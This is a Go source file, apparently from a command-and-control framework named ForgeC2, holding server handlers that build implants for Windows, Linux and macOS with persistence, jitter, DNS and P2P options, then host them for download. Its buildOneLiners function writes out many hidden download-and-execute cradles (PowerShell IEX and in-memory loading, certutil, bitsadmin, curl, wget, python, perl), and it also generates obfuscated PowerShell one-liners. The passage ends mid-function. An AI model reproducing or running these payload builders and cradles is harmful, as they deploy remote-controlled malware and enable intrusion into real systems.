package server

import (
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/obfuscation"
	"github.com/forgec2/forgec2/internal/payload"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

// Listener cache (optimization)
var (
	listenerCache     []db.Listener
	listenerCacheTime time.Time
	listenerCacheMu   sync.RWMutex
	listenerCacheTTL  = 30 * time.Second
)

func (s *Server) getListeners() []db.Listener {
	listenerCacheMu.RLock()
	if time.Since(listenerCacheTime) < listenerCacheTTL {
		result := listenerCache
		listenerCacheMu.RUnlock()
		return result
	}
	listenerCacheMu.RUnlock()

	listenerCacheMu.Lock()
	defer listenerCacheMu.Unlock()

	// Double-check after acquiring write lock
	if time.Since(listenerCacheTime) < listenerCacheTTL {
		return listenerCache
	}

	s.db.Select("id", "name", "host", "port", "protocol").
		Where("enabled = ?", true).Find(&listenerCache)
	listenerCacheTime = time.Now()
	return listenerCache
}

func (s *Server) implantDataDir() string {
	if s.cfg.Server.DataDir != "" {
		return s.cfg.Server.DataDir
	}
	return "data"
}

func (s *Server) handleImportProfile(c *gin.Context) {
	file, err := c.FormFile("profile")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "profile file required"})
		return
	}
	f, err := file.Open()
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "failed to open profile file"})
		return
	}
	defer f.Close()
	raw, err := io.ReadAll(f)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "failed to read profile file"})
		return
	}
	profile, err := payload.SaveImportedProfile(s.implantDataDir(), raw)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"success": true, "profile": profile})
}

func (s *Server) handleListProfiles(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"success": true, "profiles": payload.ListProfilePresets(s.implantDataDir())})
}

func (s *Server) handleGeneratePage(c *gin.Context) {
	listeners := s.getListeners()
	presetsJSON, _ := json.Marshal(payload.ListProfilePresets(s.implantDataDir()))

	stats := s.getNavStats()
	data := gin.H{
		"Title":               "ForgeC2 - Generate Agent",
		"ActiveNav":           "generate",
		"DefaultInt":          s.cfg.Implant.DefaultInterval,
		"DefaultJitter":       s.cfg.Implant.DefaultJitter,
		"DefaultUA":           s.cfg.Implant.DefaultUA,
		"DefaultSkipTLS":      s.cfg.Implant.DefaultSkipTLS,
		"Listeners":           listeners,
		"ProfilePresetsJSON":  template.JS(presetsJSON),
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPage(c, "generate_content", data)
}

func (s *Server) handleGenerateEXE(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		P2PMode       string `form:"p2p_mode"`
		P2PParent     string `form:"p2p_parent"`
		P2PListenAddr string `form:"p2p_listen_addr"`
		DNSDomain     string `form:"dns_domain"`
		DNSServer     string `form:"dns_server"`
		Proxy         string `form:"proxy"`
		CryptoKey     string `form:"crypto_key"`
	}
	if err := c.ShouldBind(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// Determine if P2P mode
	isP2P := form.P2PMode == "parent" || form.P2PMode == "child"
	isDNS := form.DNSDomain != "" || form.DNSServer != ""

	// Listener is required only for non-P2P, non-DNS
	if !isP2P && !isDNS && form.ListenerID == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener or DNS domain is required"})
		return
	}

	if !isP2P && !isDNS {
		var listener db.Listener
		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
			return
		}

		sch := listener.Scheme
		if sch == "" {
			sch = listener.Protocol
		}
		if sch == "" {
			sch = "http"
			if listener.Type == "tcp" {
				sch = "tcp"
			}
		}
		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)

		transport := "http"
		if sch == "tcp" || sch == "tls" {
			transport = "tcp"
		} else if sch == "dns" {
			transport = "dns"
			form.DNSDomain = listener.Host
			// DNS server IP from listener host or config
			if form.DNSServer == "" {
				form.DNSServer = listener.Host
			}
		}
		form.Protocol = transport
	} else if isDNS && form.Protocol == "" {
		form.Protocol = "dns"
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	// Map P2P form values
	p2pMode := ""
	p2pParent := ""
	p2pListenAddr := ""
	if form.P2PMode == "parent" {
		p2pMode = "tcp"
		if form.P2PListenAddr != "" {
			p2pListenAddr = form.P2PListenAddr
		}
	} else if form.P2PMode == "child" {
		p2pParent = form.P2PParent
		form.Protocol = "http"
	}

	cfg := payload.ImplantConfig{
		C2URL:         form.C2URL,
		Protocol:      form.Protocol,
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      form.Filename,
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
		P2PMode:       p2pMode,
		P2PParent:     p2pParent,
		P2PListenAddr: p2pListenAddr,
		DNSDomain:     form.DNSDomain,
		DNSServer:     form.DNSServer,
		Proxy:         form.Proxy,
		CryptoKey:     form.CryptoKey,
	}

	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
	if !filepath.IsAbs(agentsDir) {
		if abs, err := filepath.Abs(agentsDir); err == nil {
			agentsDir = abs
		}
	}
	outPath, err := payload.GenerateWindowsEXE(cfg, agentsDir)
	if err != nil {
		s.logBuild("windows", "exe", form.C2URL, form.ListenerID, form.Filename, "failed", err.Error(), "")
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if _, statErr := os.Stat(outPath); statErr != nil {
		s.logBuild("windows", "exe", form.C2URL, form.ListenerID, form.Filename, "failed", statErr.Error(), outPath)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "generated file not found: " + statErr.Error()})
		return
	}
	s.logBuild("windows", "exe", form.C2URL, form.ListenerID, form.Filename, "success", "", outPath)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(outPath)))
	c.File(outPath)
}

func (s *Server) handleGenerateLinux(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		P2PMode       string `form:"p2p_mode"`
		P2PParent     string `form:"p2p_parent"`
		P2PListenAddr string `form:"p2p_listen_addr"`
		DNSDomain     string `form:"dns_domain"`
		DNSServer     string `form:"dns_server"`
		Proxy         string `form:"proxy"`
		CryptoKey     string `form:"crypto_key"`
	}
	if err := c.ShouldBind(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	isP2P := form.P2PMode == "parent" || form.P2PMode == "child"
	isDNS := form.DNSDomain != "" || form.DNSServer != ""

	if !isP2P && !isDNS && form.ListenerID == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener or DNS domain is required"})
		return
	}

	if !isP2P && !isDNS {
		var listener db.Listener
		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
			return
		}

		sch := listener.Scheme
		if sch == "" {
			sch = listener.Protocol
		}
		if sch == "" {
			sch = "http"
			if listener.Type == "tcp" {
				sch = "tcp"
			}
		}
		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)

		transport := "http"
		if sch == "tcp" || sch == "tls" {
			transport = "tcp"
		} else if sch == "dns" {
			transport = "dns"
			form.DNSDomain = listener.Host
			if form.DNSServer == "" {
				form.DNSServer = listener.Host
			}
		}
		form.Protocol = transport
	} else if isDNS && form.Protocol == "" {
		form.Protocol = "dns"
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	p2pMode := ""
	p2pParent := ""
	p2pListenAddr := ""
	if form.P2PMode == "parent" {
		p2pMode = "tcp"
		if form.P2PListenAddr != "" {
			p2pListenAddr = form.P2PListenAddr
		}
	} else if form.P2PMode == "child" {
		p2pParent = form.P2PParent
		form.Protocol = "http"
	}

	cfg := payload.ImplantConfig{
		C2URL:         form.C2URL,
		Protocol:      form.Protocol,
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      form.Filename,
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
		P2PMode:       p2pMode,
		P2PParent:     p2pParent,
		P2PListenAddr: p2pListenAddr,
		DNSDomain:     form.DNSDomain,
		DNSServer:     form.DNSServer,
		Proxy:         form.Proxy,
		CryptoKey:     form.CryptoKey,
	}

	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
	if !filepath.IsAbs(agentsDir) {
		if abs, err := filepath.Abs(agentsDir); err == nil {
			agentsDir = abs
		}
	}
	outPath, err := payload.GenerateLinuxELF(cfg, agentsDir)
	if err != nil {
		s.logBuild("linux", "elf", form.C2URL, form.ListenerID, form.Filename, "failed", err.Error(), "")
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if _, statErr := os.Stat(outPath); statErr != nil {
		s.logBuild("linux", "elf", form.C2URL, form.ListenerID, form.Filename, "failed", statErr.Error(), outPath)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "generated file not found: " + statErr.Error()})
		return
	}
	s.logBuild("linux", "elf", form.C2URL, form.ListenerID, form.Filename, "success", "", outPath)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(outPath)))
	c.File(outPath)
}

func (s *Server) handleGenerateMacOS(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		P2PMode       string `form:"p2p_mode"`
		P2PParent     string `form:"p2p_parent"`
		P2PListenAddr string `form:"p2p_listen_addr"`
		DNSDomain     string `form:"dns_domain"`
		DNSServer     string `form:"dns_server"`
		Proxy         string `form:"proxy"`
		CryptoKey     string `form:"crypto_key"`
	}
	if err := c.ShouldBind(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	isP2P := form.P2PMode == "parent" || form.P2PMode == "child"
	isDNS := form.DNSDomain != "" || form.DNSServer != ""

	if !isP2P && !isDNS && form.ListenerID == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener or DNS domain is required"})
		return
	}

	if !isP2P && !isDNS {
		var listener db.Listener
		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
			return
		}

		sch := listener.Scheme
		if sch == "" {
			sch = listener.Protocol
		}
		if sch == "" {
			sch = "http"
			if listener.Type == "tcp" {
				sch = "tcp"
			}
		}
		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)

		transport := "http"
		if sch == "tcp" || sch == "tls" {
			transport = "tcp"
		} else if sch == "dns" {
			transport = "dns"
			form.DNSDomain = listener.Host
			if form.DNSServer == "" {
				form.DNSServer = listener.Host
			}
		}
		form.Protocol = transport
	} else if isDNS && form.Protocol == "" {
		form.Protocol = "dns"
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	p2pMode := ""
	p2pParent := ""
	p2pListenAddr := ""
	if form.P2PMode == "parent" {
		p2pMode = "tcp"
		if form.P2PListenAddr != "" {
			p2pListenAddr = form.P2PListenAddr
		}
	} else if form.P2PMode == "child" {
		p2pParent = form.P2PParent
		form.Protocol = "http"
	}

	cfg := payload.ImplantConfig{
		C2URL:         form.C2URL,
		Protocol:      form.Protocol,
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      form.Filename,
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
		P2PMode:       p2pMode,
		P2PParent:     p2pParent,
		P2PListenAddr: p2pListenAddr,
		DNSDomain:     form.DNSDomain,
		DNSServer:     form.DNSServer,
		Proxy:         form.Proxy,
		CryptoKey:     form.CryptoKey,
	}

	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
	if !filepath.IsAbs(agentsDir) {
		if abs, err := filepath.Abs(agentsDir); err == nil {
			agentsDir = abs
		}
	}
	outPath, err := payload.GenerateMacOS(cfg, agentsDir)
	if err != nil {
		s.logBuild("macos", "binary", form.C2URL, form.ListenerID, form.Filename, "failed", err.Error(), "")
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if _, statErr := os.Stat(outPath); statErr != nil {
		s.logBuild("macos", "binary", form.C2URL, form.ListenerID, form.Filename, "failed", statErr.Error(), outPath)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "generated file not found: " + statErr.Error()})
		return
	}
	s.logBuild("macos", "binary", form.C2URL, form.ListenerID, form.Filename, "success", "", outPath)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(outPath)))
	c.File(outPath)
}

func (s *Server) handleGeneratePS1(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Filename      string `form:"filename"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		Proxy         string `form:"proxy"`
		CryptoKey     string `form:"crypto_key"`
	}
	if err := c.ShouldBind(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// Listener is required
	if form.ListenerID == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener is required"})
		return
	}

	var listener db.Listener
	if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
		return
	}

	scheme := "http"
	if listener.Protocol == "https" || listener.Protocol == "tls" {
		scheme = "https"
	}
	if listener.Type == "tcp" {
		scheme = "tcp"
	}
	form.C2URL = fmt.Sprintf("%s://%s:%d", scheme, listener.Host, listener.Port)
	form.Protocol = scheme
	if scheme == "tcp" || scheme == "tls" {
		form.Protocol = "tcp"
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	cfg := payload.ImplantConfig{
		C2URL:         form.C2URL,
		Protocol:      form.Protocol,
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      form.Filename,
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
		Proxy:         form.Proxy,
	}

	ps1Code, err := payload.GeneratePowerShellSource(cfg, s.implantDataDir())
	if err != nil {
		s.logBuild("windows", "ps1", form.C2URL, form.ListenerID, form.Filename, "failed", err.Error(), "")
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	oneLiner := obfuscation.GenerateCommandLineOneLiner(ps1Code)

	s.logBuild("windows", "ps1", form.C2URL, form.ListenerID, form.Filename, "success", "", "")
	c.JSON(http.StatusOK, gin.H{
		"success":         true,
		"code":            oneLiner,
		"original_length": len(ps1Code),
		"obfuscated_len":  len(oneLiner),
	})
}

// oneLinerItem represents a single one-liner variant returned to the UI
type oneLinerItem struct {
	Name    string `json:"name"`
	Command string `json:"command"`
	Desc    string `json:"desc"`
}

// handleGenerateOneLiner generates a payload and returns 10+ one-liner variants
func (s *Server) handleGenerateOneLiner(c *gin.Context) {
	var form struct {
		C2URL         string `form:"c2_url"`
		Protocol      string `form:"protocol"`
		Interval      int    `form:"interval"`
		Jitter        int    `form:"jitter"`
		BeaconTime    int    `form:"beacon_time"`
		UserAgent     string `form:"user_agent"`
		Persist       bool   `form:"persist"`
		SkipTLSVerify bool   `form:"skip_tls_verify"`
		Profile       string `form:"profile"`
		ListenerID    uint   `form:"listener_id"`
		PayloadType   string `form:"payload_type"` // "exe", "ps1", "linux"
		Proxy         string `form:"proxy"`
		CryptoKey     string `form:"crypto_key"`
		P2PMode       string `form:"p2p_mode"`
		P2PParent     string `form:"p2p_parent"`
		P2PListenAddr string `form:"p2p_listen_addr"`
		DNSDomain     string `form:"dns_domain"`
		DNSServer     string `form:"dns_server"`
	}
	if err := c.ShouldBind(&form); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	payloadType := form.PayloadType
	if payloadType == "" {
		payloadType = "exe"
	}

	// Validate and get listener
	isP2P := form.P2PMode == "parent" || form.P2PMode == "child"
	isDNS := form.DNSDomain != "" || form.DNSServer != ""

	if !isP2P && !isDNS && form.ListenerID == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener or DNS/P2P config is required"})
		return
	}

	if !isP2P && !isDNS {
		var listener db.Listener
		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
			return
		}

		sch := listener.Scheme
		if sch == "" {
			sch = listener.Protocol
		}
		if sch == "" {
			sch = "http"
			if listener.Type == "tcp" {
				sch = "tcp"
			}
		}
		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)

		transport := "http"
		if sch == "tcp" || sch == "tls" {
			transport = "tcp"
		} else if sch == "dns" {
			transport = "dns"
			form.DNSDomain = listener.Host
			if form.DNSServer == "" {
				form.DNSServer = listener.Host
			}
		}
		form.Protocol = transport
	} else if isDNS && form.Protocol == "" {
		form.Protocol = "dns"
	}

	interval := form.Interval
	if form.BeaconTime > 0 {
		interval = form.BeaconTime
	}

	p2pMode := ""
	p2pParent := ""
	p2pListenAddr := ""
	if form.P2PMode == "parent" {
		p2pMode = "tcp"
		if form.P2PListenAddr != "" {
			p2pListenAddr = form.P2PListenAddr
		}
	} else if form.P2PMode == "child" {
		p2pParent = form.P2PParent
		form.Protocol = "http"
	}

	cfg := payload.ImplantConfig{
		C2URL:         form.C2URL,
		Protocol:      form.Protocol,
		Interval:      interval,
		Jitter:        form.Jitter,
		UserAgent:     form.UserAgent,
		Persist:       form.Persist,
		SkipTLSVerify: form.SkipTLSVerify,
		Filename:      "forgec2_beacon",
		Debug:         false,
		Profile:       form.Profile,
		ListenerID:    form.ListenerID,
		P2PMode:       p2pMode,
		P2PParent:     p2pParent,
		P2PListenAddr: p2pListenAddr,
		DNSDomain:     form.DNSDomain,
		DNSServer:     form.DNSServer,
		Proxy:         form.Proxy,
		CryptoKey:     form.CryptoKey,
	}

	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
	if !filepath.IsAbs(agentsDir) {
		if abs, err := filepath.Abs(agentsDir); err == nil {
			agentsDir = abs
		}
	}

	// Generate the payload
	var (
		genPath  string
		genErr   error
		ps1Code  string
		filename string
		format   string
	)
	switch payloadType {
	case "exe":
		genPath, genErr = payload.GenerateWindowsEXE(cfg, agentsDir)
		filename = "beacon.exe"
		format = "exe"
	case "ps1":
		ps1Code, genErr = payload.GeneratePowerShellSource(cfg, s.implantDataDir())
		filename = "beacon.ps1"
		format = "ps1"
	case "linux":
		genPath, genErr = payload.GenerateLinuxELF(cfg, agentsDir)
		filename = "beacon.elf"
		format = "elf"
	default:
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid payload_type, must be exe, ps1, or linux"})
		return
	}

	if genErr != nil {
		s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "failed", genErr.Error(), "")
		c.JSON(http.StatusInternalServerError, gin.H{"error": genErr.Error()})
		return
	}

	// Copy the payload to the hosted payloads directory for download
	payloadsDir := filepath.Join(s.cfg.Server.DataDir, "payloads")
	os.MkdirAll(payloadsDir, 0755)

	payloadID := uuid.New().String()
	payloadSubDir := filepath.Join(payloadsDir, payloadID)
	os.MkdirAll(payloadSubDir, 0755)

	hostPath := filepath.Join(payloadSubDir, filename)

	if payloadType == "ps1" {
		os.WriteFile(hostPath, []byte(ps1Code), 0644)
	} else {
		input, readErr := os.ReadFile(genPath)
		if readErr != nil {
			s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "failed", readErr.Error(), "")
			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read generated payload: " + readErr.Error()})
			return
		}
		os.WriteFile(hostPath, input, 0644)
	}

	// Build the download URL from the current request
	scheme := "http"
	if c.Request.TLS != nil {
		scheme = "https"
	}
	baseURL := fmt.Sprintf("%s://%s", scheme, c.Request.Host)
	payloadURL := fmt.Sprintf("%s/payloads/%s/%s", baseURL, payloadID, filename)

	// Generate one-liner variants
	oneLiners := buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, form.Proxy)

	s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "success", "", hostPath)
	c.JSON(http.StatusOK, gin.H{
		"success":      true,
		"payload_id":   payloadID,
		"filename":     filename,
		"download_url": payloadURL,
		"types":        oneLiners,
	})
}

// buildOneLiners generates all one-liner variants based on payload type
func buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, proxy string) []oneLinerItem {
	var items []oneLinerItem

	switch payloadType {
	case "exe":
		items = append(items, oneLinerItem{
			Name: "PowerShell Download + Exec",
			Desc: "Download EXE to temp dir and execute",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "$p='$env:TEMP\\svc.exe';[Net.WebClient]::new().DownloadFile('%s',$p);Start-Process $p"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "PowerShell Memory Load (.NET)",
			Desc: "Load .NET EXE directly from memory (no disk write)",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "[Reflection.Assembly]::Load([Net.WebClient]::new().DownloadData('%s')).EntryPoint.Invoke($null,$null)"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "certutil",
			Desc: "Download via certutil and execute",
			Command: fmt.Sprintf(
				`certutil -urlcache -split -f %s %%TEMP%%\\svc.exe & start /b %%TEMP%%\\svc.exe`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "BITSAdmin",
			Desc: "Background download via BITSAdmin and execute",
			Command: fmt.Sprintf(
				`bitsadmin /transfer forgec2 /download /priority high %s %%TEMP%%\\svc.exe & start /b %%TEMP%%\\svc.exe`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "curl.exe + start",
			Desc: "Download via curl and execute (Win10+ built-in)",
			Command: fmt.Sprintf(
				`curl -sL %s -o %%TEMP%%\\svc.exe & start /b %%TEMP%%\\svc.exe`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "PowerShell WebClient + IEX (Obfuscated)",
			Desc: "Obfuscated PowerShell remote download and execute",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('%s')"`,
				payloadURL),
		})

	case "ps1":
		// URL-based download cradle
		items = append(items, oneLinerItem{
			Name: "IEX DownloadString",
			Desc: "Remote download PS1 script and execute via IEX",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('%s')"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "IEX DownloadString + SSL",
			Desc: "Remote download and execute ignoring cert errors",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object Net.WebClient).DownloadString('%s')"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name:    "PowerShell Base64 (Self-Contained)",
			Desc:    "Built-in Base64 encoded PS1 script, no download needed",
			Command: obfuscation.GenerateCommandLineOneLiner(ps1Code),
		})
		items = append(items, oneLinerItem{
			Name: "IEX DownloadString + Proxy",
			Desc: "Download and execute via HTTP proxy",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "$wc=New-Object Net.WebClient;$wc.Proxy=New-Object Net.WebProxy('%s');IEX($wc.DownloadString('%s'))"`,
				proxy, payloadURL),
		})

	case "linux":
		items = append(items, oneLinerItem{
			Name: "curl download + exec",
			Desc: "Download ELF to /tmp and execute (background)",
			Command: fmt.Sprintf(
				`curl -sL %s -o /tmp/.u && chmod +x /tmp/.u && nohup /tmp/.u &`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "wget download + exec",
			Desc: "Download ELF via wget and execute",
			Command: fmt.Sprintf(
				`wget -q %s -O /tmp/.u && chmod +x /tmp/.u && nohup /tmp/.u &`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "python3 download + exec",
			Desc: "Download via Python3 urllib and execute",
			Command: fmt.Sprintf(
				`python3 -c "import urllib.request,os;f='/tmp/.u';urllib.request.urlretrieve('%s',f);os.chmod(f,0o755);os.system(f+' &')"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "python2 download + exec",
			Desc: "Download via Python2 urllib and execute",
			Command: fmt.Sprintf(
				`python -c "import urllib,os;f='/tmp/.u';urllib.urlretrieve('%s',f);os.chmod(f,0o755);os.system(f+' &')"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "perl download + exec",
			Desc: "Download via Perl and execute",
			Command: fmt.Sprintf(
				`perl -e "use LWP::Simple;getstore('%s','/tmp/.u');chmod 0755,'/tmp/.u';system('/tmp/.u &')"`,
				payloadURL),
		})
	}

	return items
}

// handleServePayload serves hosted payload files for one-liner download
func (s *Server) handleServePayload(c *gin.Context) {
	payloadID := c.Param("id")
	filename := c.Param("filename")
	if payloadID == "" || filename == "" || strings.Contains(payloadID, "..") || strings.Contains(filename, "..") {
		c.String(http.StatusBadRequest, "Invalid path")
		return
	}

	payloadPath := filepath.Join(s.cfg.Server.DataDir, "payloads", payloadID, filename)
	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		c.Status(http.StatusNotFound)
		return
	}
	c.FileAttachment(payloadPath, filename)
}

// cleanupOldPayloads removes hosted payloads older than 1 hour
func (s *Server) cleanupOldPayloads() {
	payloadsDir := filepath.Join(s.cfg.Server.DataDir, "payloads")
	entries, err := os.ReadDir(payloadsDir)
	if err != nil {
		return
	}
	cutoff := time.Now().Add(-1 * time.Hour)
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		subDir := filepath.Join(payloadsDir, e.Name())
		info, err := e.Info()
		if err != nil {
			continue
		}
		if info.ModTime().Before(cutoff) {
			os.RemoveAll(subDir)
			slog.Debug("Cleaned up old payload", "dir", subDir)
		}
	}
}

func (s *Server) handleListListeners(c *gin.Context) {
	var listeners []db.Listener
	s.db.Order("created_at desc").Find(&listeners)
	c.JSON(http.StatusOK, gin.H{"success": true, "data": listeners})
}

func (s *Server) handleListenerDetail(c *gin.Context) {
	id := c.Param("id")
	var listener db.Listener
	if err := s.db.First(&listener, id).Error; err != nil {
		c.String(http.StatusNotFound, "Listener not found")
		return
	}

	var agents []db.Implant
	s.db.Where("listener_id = ?", listener.ID).Order("last_seen desc").Find(&agents)

	activeCount := 0
	now := time.Now()
	for _, a := range agents {
		if now.Sub(a.LastSeen) < 5*time.Minute {
			activeCount++
		}
	}

	stats := s.getNavStats()
	data := gin.H{
		"Title":        fmt.Sprintf("ForgeC2 - Listener %s", listener.Name),
		"ActiveNav":    "listeners",
		"Listener":     listener,
		"Agents":       agents,
		"TotalAgents":  len(agents),
		"ActiveAgents": activeCount,
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPage(c, "listener_detail_content", data)
}

func (s *Server) handleCreateListener(c *gin.Context) {
	var l db.Listener
	if err := c.ShouldBindJSON(&l); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if l.Name == "" {
		l.Name = "Listener " + fmt.Sprintf("%d", l.Port)
	}

	// Normalize: prefer Scheme, derive Type and Protocol
	if l.Scheme != "" {
		l.Protocol = l.Scheme
		switch l.Scheme {
		case "http", "https":
			l.Type = "http"
		case "dns":
			l.Type = "dns"
		default:
			l.Type = "tcp"
		}
	} else if l.Protocol != "" {
		l.Scheme = l.Protocol
		switch l.Protocol {
		case "http", "https":
			l.Type = "http"
		case "dns":
			l.Type = "dns"
		default:
			l.Type = "tcp"
		}
	} else if l.Type != "" {
		switch l.Type {
		case "http":
			l.Scheme = "http"
			l.Protocol = "http"
		case "dns":
